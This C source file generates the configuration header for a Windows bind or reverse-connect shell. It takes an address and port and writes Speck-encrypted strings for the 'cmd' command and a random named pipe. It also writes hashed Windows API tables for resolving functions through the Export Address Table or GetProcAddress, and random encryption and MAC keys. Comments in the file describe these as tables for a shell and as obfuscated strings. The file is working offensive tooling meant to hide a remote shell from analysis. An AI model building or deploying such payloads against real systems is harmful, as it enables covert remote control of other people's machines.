/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#if defined(_WIN32) || defined(_WIN64)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0502
#endif
#define WIN
#define _CRT_SECURE_NO_WARNINGS
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_  
#endif

#include <windows.h>
#include <shlwapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mstcpip.h>

#define close closesocket
#define SHUT_RDWR SD_BOTH

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")

#else

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <signal.h>
#include <fcntl.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "speck.h"

enum strhash_opts {
  STR_HASH_LOWER=1,
  STR_HASH_UPPER
};

#define BLOCK_LENGTH         8
#define BC_KEY_LENGTH        16

#define ENCRYPT_BLK          speck64_encryptx 

#define KERNEL_TBL_NAME      "k32"
#define WS2_32_TBL_NAME      "ws32"
#define SCHAN_TBL_NAME       "schan"
#define WINET_TBL_NAME       "winet"
#define OLE32_TBL_NAME       "ole32"
#define OLEAUT32_TBL_NAME    "oleaut32"

#define DEFAULT_PORT         1234
#define DEFAULT_IP           "127.0.0.1"
#define DEFAULT_CMD          "cmd"

#define MAX_CRYPT_KEY_LEN      16 // 128-bits
#define MAX_CRYPT_STRING_LEN   32 // 256-bits

enum cmd_opt {
  API_MODE_EAT=1,
  API_MODE_IAT,
  NET_MODE_BIND,
  NET_MODE_CONNECT
};
  
// structure for options
typedef struct _cfg_opts_t {
  FILE      *out;
  uint8_t   key[MAX_CRYPT_KEY_LEN];
  int       net_mode, api_mode;
  char      *port, *address;
  char      *peb_module, *iat_module;
  int       port_nbr, ai_family;
  int       ai_addrlen;
  struct    sockaddr *ai_addr;
  struct    sockaddr_in  v4;
  struct    sockaddr_in6 v6;
  char      ip[INET6_ADDRSTRLEN];
} cfg_opts_t;

typedef struct api_tbl_t {
  int       cnt;
  char      **api;
  char      *tbl_name, *dll_name;  
} api_tbl;

void gen_rand(void*, int);
uint64_t strhash(void*, void*);
void bin2hex(cfg_opts_t*,const char*, const void*, int);
void strcrypt_inv(cfg_opts_t*, const char*, void*);
char *strcrypt(cfg_opts_t*, void*);
void print_apis(cfg_opts_t*,api_tbl*);
void print_hash(cfg_opts_t*,const char*,void*,int);
void gen_cfg(cfg_opts_t*);
void print_array(cfg_opts_t*,const char*,uint8_t*, int);
 
char *kernel32[]={
  "CreateNamedPipeA",
  "CreatePipe",
  "CreateFileA",
  "WriteFile",
  "ReadFile",
  "GetOverlappedResult",
  "CreateProcessA",
  "TerminateProcess",
  "CreateEventA",
  "CloseHandle",
  "WaitForMultipleObjects",
  "LoadLibraryA"  
};

char *ws2_32[]={
  "socket",
  "shutdown",
  "send",
  "recv",
  "closesocket",
  "ioctlsocket",
  "WSAEventSelect",
  "WSAEnumNetworkEvents",
  "WSACreateEvent",
  "WSAStartup",
  "connect",
  "bind",
  "listen",
  "accept"
};

char *ole32[]={ 
  "CoCreateInstance",
  "CoUninitialize",
  "CoInitializeSecurity",
  "CoInitializeEx",
  "CoSetProxyBlanket"
};

char *oleaut32[]={
  "SysAllocString",
  "SysFreeString",
  "VariantInit",
  "VariantClear",
  "VariantChangeType",
  "SafeArrayCreate",
  "SafeArrayDestroy",
  "SafeArrayGetUBound",
  "SafeArrayGetLBound",
  "SafeArrayAccessData",
  "SafeArrayUnaccessData",
};

char *winet[]={
  "InternetWriteFile",
  "InternetReadFileExA",
  "InternetCloseHandle",
  "HttpEndRequestA",
  "HttpSendRequestExA",
  "HttpSendRequestA",
  "HttpOpenRequestA",
  "InternetConnectA",
  "InternetSetStatusCallback",
  "InternetSetOptionA",
  "InternetOpenA"
};

// tables for bind/reverse connect shell
api_tbl tbl[2]={
  {sizeof(kernel32)/sizeof(char*), kernel32, KERNEL_TBL_NAME, "kernel32.dll" }, 
  {sizeof(ws2_32)/sizeof(char*),   ws2_32,   WS2_32_TBL_NAME, "ws2_32.dll"   }};
  
typedef union _str_hash_t {
    uint8_t  b[MAX_CRYPT_STRING_LEN];
    uint32_t w[MAX_CRYPT_STRING_LEN/sizeof(uint32_t)];
} str_hash;
  
#ifdef WIN
/**F*****************************************************************/
void xstrerror (char *fmt, ...) 
/**
 * PURPOSE : Display windows error
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
    char    *error=NULL;
    va_list arglist;
    char    buffer[2048];
    DWORD   dwError=GetLastError();
    
    va_start (arglist, fmt);
    wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
        (LPSTR)&error, 0, NULL))
    {
      printf ("[ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      printf ("[ %s : %lu\n", buffer, dwError);
    }
}

typedef LONG (NTAPI *RtlIpv4StringToAddress_t)(
  _In_  PCTSTR  S,
  _In_  BOOLEAN Strict,
  _Out_ LPCTSTR *Terminator,
  _Out_ IN_ADDR *Addr
);

typedef LONG (NTAPI *RtlIpv6StringToAddress_t)(
  _In_  PCTSTR   S,
  _Out_ PCTSTR   *Terminator,
  _Out_ IN6_ADDR *Addr
);

int inet_pton(int family, const char *str, void *dst) {
    LPCTSTR                  delim = NULL;
    LONG                     ret   = ~0UL;
    HMODULE                  ntdll;
    RtlIpv4StringToAddress_t pRtlIpv4StringToAddress;
    RtlIpv6StringToAddress_t pRtlIpv6StringToAddress;
    
    ntdll = GetModuleHandle("ntdll");
     
    if (family==AF_INET) {
      pRtlIpv4StringToAddress = (RtlIpv4StringToAddress_t)GetProcAddress(ntdll, "RtlIpv4StringToAddressA");
      if (pRtlIpv4StringToAddress != NULL) {
        ret = pRtlIpv4StringToAddress(str, TRUE, &delim, dst);
      }
    } else {
      pRtlIpv6StringToAddress = (RtlIpv6StringToAddress_t)GetProcAddress(ntdll, "RtlIpv6StringToAddressA");
      if (pRtlIpv6StringToAddress != NULL) {
        ret = pRtlIpv6StringToAddress(str, &delim, dst);
      }
    }
    return ret;    
}

#else
void xstrerror(char *fmt, ...)
{
    char    buffer[2048];
    va_list arglist;

    va_start (arglist, fmt);
    vsnprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
    va_end (arglist);
    
    printf ("[ %s : %s\n", buffer, strerror(errno));  
}
#endif

int init_network (cfg_opts_t *p)
/**
 * PURPOSE : initialize winsock for windows, resolve network address
 *
 * RETURN :  1 for okay else 0
 *
 * NOTES :   None
 *
 *F*/
{
    struct addrinfo *list=NULL, *e=NULL;
    struct addrinfo hints;
    int             t;
    
    // initialize winsock if windows
    #ifdef WIN
      WSADATA wsa;
      WSAStartup (MAKEWORD (2, 0), &wsa);
    #endif

    // set network address length to zero
    p->ai_addrlen = 0;
    
    // if no address supplied
    if (p->address==NULL)
    {
      // is it ipv4?
      if (p->ai_family==AF_INET) {
        p->v4.sin_family      = AF_INET; 
        p->v4.sin_port        = htons((u_short)p->port_nbr);
        p->v4.sin_addr.s_addr = INADDR_ANY;
        
        p->ai_addr            = (struct sockaddr*)&p->v4;
        p->ai_addrlen         = sizeof (struct sockaddr_in);
      } else {
        // else it's ipv6
        p->v6.sin6_family     = AF_INET6;
        p->v6.sin6_port       = htons((u_short)p->port_nbr);
        p->v6.sin6_addr       = in6addr_any;
        
        p->ai_addr            = (struct sockaddr*)&p->v6;
        p->ai_addrlen         = sizeof (struct sockaddr_in6);
      }
    } else {
      memset (&hints, 0, sizeof (hints));

      hints.ai_flags    = AI_PASSIVE;
      hints.ai_family   = p->ai_family;
      hints.ai_socktype = SOCK_STREAM;
      hints.ai_protocol = IPPROTO_TCP;    
      
      // get all network addresses
      printf ("[ resolving network address...\n");
      t=getaddrinfo (p->address, p->port, &hints, &list);
      
      if (t == 0) 
      {
        for (e=list; e!=NULL; e=e->ai_next) 
        {
          // copy to ipv4 structure
          if (p->ai_family==AF_INET) {
            memcpy (&p->v4, e->ai_addr, e->ai_addrlen);
            p->ai_addr     = (struct sockaddr*)&p->v4;        
          } else {
            // ipv6 structure
            memcpy (&p->v6, e->ai_addr, e->ai_addrlen);
            p->ai_addr     = (struct sockaddr*)&p->v6;
          }
          // assign size of structure
          p->ai_addrlen = e->ai_addrlen;
          break;
        }
        freeaddrinfo (list);
      } else {
        xstrerror ("getaddrinfo");
      }
    }
    return p->ai_addrlen;
}

/**F*****************************************************************/
void usage (void) 
{
    printf ("\n  usage: gen_cfg <address> [options]\n");
    printf ("\n  -4                Use IP version 4 for TCP (default)");
    printf ("\n  -6                Use IP version 6 for TCP");
    printf ("\n  -l                Bind to address, default is connect");
    printf ("\n  -i <DLL|EXE, DLL> Use GetProcAddress located in Import Address Table (IAT) to resolve API by string");
    printf ("\n  -x                Use Export Address Table (EAT) to resolve API by hash");
    printf ("\n  -p <number>       Port number to use (default is %i)\n\n", 
        DEFAULT_PORT);
    exit (0);
}

/**F*****************************************************************/
char* getparam (int argc, char *argv[], int *i)
{
    int n=*i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i=n+1;
      return argv[n+1];
    }
    printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

// modes are separated by comma or semi-colon
void set_iat_opts(cfg_opts_t *p, char *m)
{
    char *t = strtok(m, ",;");
    
    // get the EXE or DLL module that imports GetProcAddress
    if (t != NULL) {
      p->peb_module = t;
    }
    
    // get the DLL that exports GetProcAddress
    // usually this is kernel32.dll ...
    t = strtok(NULL, ",;");
    
    if (t != NULL) {
      p->iat_module = t;
    }
}

void parse_args (cfg_opts_t *p, int argc, char *argv[])
{
    int  i;
    char opt;
    
    // for each argument
    for (i=1; i<argc; i++)
    {
      // is this option?
      if (argv[i][0]=='-' || argv[i][0]=='/')
      {
        // get option value
        opt=argv[i][1];
        
        switch (opt)
        {
          // use ipv4 (default)
          case '4':
            p->ai_family = AF_INET;
            break;
          // use ipv6  
          case '6':     
            p->ai_family = AF_INET6;
            break;
          // use the import address table?        
          case 'i':
            p->api_mode  = API_MODE_IAT;
            set_iat_opts(p, getparam(argc, argv, &i));
            break;      
          // use the export address table?  
          case 'x':
            p->api_mode  = API_MODE_EAT;
            break;           
          // listen for incoming connections?  
          case 'l':
            p->net_mode  = NET_MODE_BIND; 
            break;          
          // port number to connect or bind on  
          case 'p':     // port number
            p->port      = getparam(argc, argv, &i);
            p->port_nbr  = atoi(p->port);
            break;
          case '?':     // display usage
          case 'h':
            usage ();
            break;
          default:
            printf ("  [ unknown option %c\n", opt);
            break;
        }
      } else {
        // assume it's hostname or ip
        p->address  = argv[i];
        p->net_mode = NET_MODE_CONNECT;
      }
    }
}

int main(int argc, char *argv[])
{
    cfg_opts_t args;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    
    memset (&args, 0, sizeof(args));
    
    parse_args(&args, argc, argv);
    gen_cfg(&args);
    return 0;
}

void gen_cfg(cfg_opts_t *p)
{
    uint8_t    t[128];
    char       pipe_name[MAX_CRYPT_STRING_LEN+1];
    int        pipe_name_len;    
    
  p->out = fopen("cfg.h", "wb");

  if (p->out != NULL)
  {
    srand(time(0)); // mwahahaha... :P
        
    fprintf (p->out, "\n\n// AUTO GENERATED. DO NOT EDIT\n"); 
    fprintf (p->out, "\n// Windows %s shell", 
        p->net_mode==NET_MODE_BIND ? "Bind" : "Connect");
        
    fprintf (p->out, "\n// API Mode   : %s", 
        p->api_mode==API_MODE_IAT ? "IAT" : "EAT");
    
    if (p->api_mode==API_MODE_IAT) {
      fprintf (p->out, "\n// PEB module : %s", p->peb_module);
      fprintf (p->out, "\n// IAT module : %s\n", p->iat_module);
    }
    printf ("\n\n[+] Generating GLOBAL_CFG");
    printf ("\nIP Address : %s", p->address);
    printf ("\nPort number: %i", p->port_nbr);
    
    fprintf (p->out, "\n#ifdef GLOBAL_CFG\n");     
    fprintf (p->out, "\n#define MAX_CRYPT_KEY_LEN    %i", MAX_CRYPT_KEY_LEN);
    fprintf (p->out, "\n#define MAX_CRYPT_STRING_LEN %i", MAX_CRYPT_STRING_LEN);
    //fprintf (p->out, "\n#define %s", 
    //    p->net_mode==NET_MODE_BIND ? "NET_MODE_BIND" : "NET_MODE_CONNECT");
    
    fprintf (p->out, "\n#define AF_FAMILY            %s",
        p->ai_family==AF_INET ? "AF_INET" : "AF_INET6"); 
        
    fprintf (p->out, "\n#define DEFAULT_PORT         0x%04X     // %i", 
        htons(p->port_nbr), p->port_nbr);
        
    fprintf (p->out, "\n#define %s", 
        p->api_mode==API_MODE_IAT ? "API_MODE_IAT" : "API_MODE_EAT");
        
    fprintf (p->out, "\n\n#endif\n");    
    fprintf (p->out, "\n#ifdef MAIN_CFG\n");

    // remote/local address for connection
    memset(t, 0, sizeof(t));
    inet_pton(p->ai_family, p->address, (void*)t); 
    
    print_array(p, "DEFAULT_IP", t, 
        p->ai_family==AF_INET ? sizeof(struct in_addr) : sizeof(struct in6_addr));
        
    // strhash + strcrypt key
    gen_rand(p->key, MAX_CRYPT_KEY_LEN);
    print_array(p, "strcrypt_key", p->key, MAX_CRYPT_KEY_LEN);
    
    // block cipher key
    gen_rand(t, BC_KEY_LENGTH);
    print_array(p, "enc_key", t, BC_KEY_LENGTH);
    
    // mac key
    gen_rand(t, BC_KEY_LENGTH*2);
    print_array(p, "mac_key", t, BC_KEY_LENGTH*2);
    
    print_hash(p, "ws2_32", "ws2_32", strlen("ws2_32"));    
    print_apis(p, &tbl[0]);
    print_apis(p, &tbl[1]);     
    fprintf (p->out, "\n#endif\n");
    
    // obfuscated strings for obtaining GetProcAddress from IAT
    if (p->api_mode == API_MODE_IAT) {
      printf ("\n\n[+] Generating GET_PROC_CFG");
      printf ("\nPEB module : %s", p->peb_module);
      printf ("\nIAT module : %s", p->iat_module);
    
      fprintf (p->out, "\n#ifdef GET_PROC_CFG\n");
      print_hash(p, "peb_dll", p->peb_module, strlen(p->peb_module));
      print_hash(p, "iat_dll", p->iat_module, strlen(p->iat_module));
      print_hash(p, "gpa_str", "GetProcAddress", strlen("GetProcAddress"));
      fprintf (p->out, "\n#endif\n");
    }
    
    printf ("\n\n[+] Generating CMD_CFG");
    // create pipe name
    gen_rand(t, sizeof(t));
    
    pipe_name_len = sprintf(pipe_name, 
        "\\\\.\\pipe\\%02x%02x%02x%02x%02x%02x%02x%02x",
        t[0], t[1], t[2], t[3], t[4], t[5], t[6], t[7]);
        
    printf ("\nPipe name  : %s", pipe_name);
    printf ("\ncmd string : %s", DEFAULT_CMD);
    
    // obfuscated strings for executing command
    fprintf (p->out, "\n#ifdef CMD_CFG\n");
    print_hash(p, "pipe_str", pipe_name, pipe_name_len);
    print_hash(p, "cmd_str", DEFAULT_CMD, strlen(DEFAULT_CMD));
    fprintf (p->out, "\n#endif\n");  
    
    fclose(p->out);
  }
}

void print_array(cfg_opts_t* p, 
    const char *desc, 
    uint8_t array[], int len) 
{
    int i;
    
    fprintf (p->out, "\nuint8_t %s[]={", desc);
    
    for (i=0; i<len; i++) {
      if ((i & 7)==0) fprintf(p->out, "\n    ");
      fprintf (p->out, "0x%02x", array[i]);
      if ((i+1) != len) fprintf(p->out, ", ");
    }
    fprintf (p->out, " };\n");
}

// we don't need a CSPRNG for configuration values
// the goal is to obfuscate strings and nothing more
void gen_rand(void *out, int len) {
    int     i;
    uint8_t x;
    
    for (i=0; i<len; i++) {
      x = (uint8_t)(rand() % 256);
      if (!x) x++;
      ((uint8_t*)out)[i] = x;
    }
}

void print_hash(cfg_opts_t* p, 
    const char *desc, 
    void *in, int inlen) 
{
    uint8_t hash[MAX_CRYPT_STRING_LEN];
    uint8_t t[MAX_CRYPT_STRING_LEN];
    
    memset(t, 0, sizeof(t));
    memcpy(t, in, inlen);
    
    gen_rand(&t[inlen+1], MAX_CRYPT_STRING_LEN - (inlen+1));
    
    fprintf (p->out, "\nuint8_t %s[]=", desc);
    strcrypt_inv(p, t, hash);
    bin2hex(p, desc, hash, 1);
}

void print_apis(cfg_opts_t* p, api_tbl *tbl) {
    int      i;
    char     *name;
    size_t   len;
    char     str[MAX_CRYPT_STRING_LEN+1], hash[MAX_CRYPT_STRING_LEN];    
    uint64_t h;
    
    fprintf (p->out, "\n\n    //**********************");
    fprintf (p->out, "\n    // %s", 
        tbl->dll_name==NULL ? "kernel32.dll" : tbl->dll_name);
    fprintf (p->out, "\n    //**********************");
    
    if (p->api_mode == API_MODE_IAT) {
      fprintf (p->out, "\nuint8_t %s_tbl[%i][MAX_CRYPT_STRING_LEN]={", 
          tbl->tbl_name, tbl->cnt);
    } else {
      fprintf (p->out, "\nuint64_t %s_tbl[]={", tbl->tbl_name);
    }
    
    for (i=0; i<tbl->cnt; i++) {
      name = tbl->api[i];
      len  = strlen(name);
    
      if (len > MAX_CRYPT_STRING_LEN) {
        len = MAX_CRYPT_STRING_LEN;
        printf ("\nERROR: %s exceeds MAX_CRYPT_STRING_LEN", name);
        exit(0);
      }
      memset (str, 0, sizeof(str));
      memcpy (str, name, len);
      
      if (p->api_mode == API_MODE_IAT) {
        gen_rand(&str[len+1], MAX_CRYPT_STRING_LEN - (len+1));

        strcrypt_inv(p, str, hash);      
        bin2hex(p, tbl->api[i], hash, ((i+1) == tbl->cnt) << 1);
      } else {
        h = strhash(p->key, tbl->dll_name);
        h += strhash(p->key, tbl->api[i]);
        fprintf (p->out, "\n    0x%016llx", h);
        fprintf(p->out, " %s // %s", 
            ((i+1) == tbl->cnt) ? "};" : ", ", tbl->api[i]);
      }
    } 
}  

void strcrypt_inv(cfg_opts_t* opt, const char *str, void *out) {
    uint32_t subkeys[SPECK64_RNDS+1];
    uint64_t *p=(uint64_t*)str;
    uint64_t *o=(uint64_t*)out;
    int      i;
    
    speck64_setkey(opt->key, subkeys);
    
    for (i=0; i<MAX_CRYPT_STRING_LEN/sizeof(uint64_t); i++) {
      o[i] = p[i];
      speck64_encrypt(subkeys, SPECK_DECRYPT, &o[i]);
    }
}

// generate 64-bit hash of short string using 128-bit key
uint64_t strhash(void *key, void *str) {
    union {
      uint8_t  b[BLOCK_LENGTH];
      uint64_t q;
    } m, h;
    uint8_t *p=(uint8_t*)str;
    int     i, idx=0;
    
    h.q = 0;
    
    while (*p) {
      // add byte to buffer
      // increase index and string pointer
      m.b[idx++] = *p++;
      // buffer filled?
      if (idx == BLOCK_LENGTH) {
        // encrypt buffer
        ENCRYPT_BLK(key, &m);
        // reset index
        idx  = 0;
        // add ciphertext to hash value
        h.q += m.q;
      }    
    }
    // add the end bit
    m.b[idx++] = 0x80;
    // absorb final string bits into hash
    for (i=0; i<idx; i++) {
      h.b[i] += m.b[i];
    }
    // encrypt one last time
    ENCRYPT_BLK(key, &h);
    // return 64-bit hash
    return h.q;
}

char *strcrypt(cfg_opts_t* p, void *crypt) {
    static char buf[MAX_CRYPT_STRING_LEN];
    int         i;
    uint64_t    *o=(uint64_t*)buf;
    
    memcpy(buf, crypt, MAX_CRYPT_STRING_LEN);
    
    for (i=0; i<MAX_CRYPT_STRING_LEN/sizeof(uint64_t); i++) {
      speck64_encryptx(p->key, &o[i]);
    }
    return buf;
}

/*
void save_cfg(cfg_opts_t* p) {
    FILE *out = fopen("cfg.dat", "wb");
    
    if (out != NULL) {
      // protocol version
      fwrite();
      // port number
      fwrite();
      // address
      fwrite();
      // save counter value (normally zero)
      fwrite();
      // save encryption key
      fwrite();
      // save mac key
      fwrite();
    } else {
      xstrerror("fopen");
    }
}
*/
void bin2hex (cfg_opts_t* p, const char *desc, void* buf, int last)
{
    size_t   i;
    uint8_t *b=(uint8_t*)buf;
    
    fprintf (p->out, "\n{ ");
    
    for (i=0; i<MAX_CRYPT_STRING_LEN; i++) {
      // print new line every 4 elements
      if ((i & 7)==0) fprintf(p->out, "\n    ");
      // print 4 byte integer
      fprintf (p->out, "0x%02x", b[i]);
      // if this is not the last one, print comma
      if ((i+1) != (MAX_CRYPT_STRING_LEN)) {
        fprintf(p->out, ", ");
      } else {
        if (last==2) fprintf(p->out, "  }");
        // otherwise, terminate if last is true
        fprintf(p->out, " %s", last ? "};" : "},");
      }
    }
    fprintf (p->out, " // %s\n", desc);
}
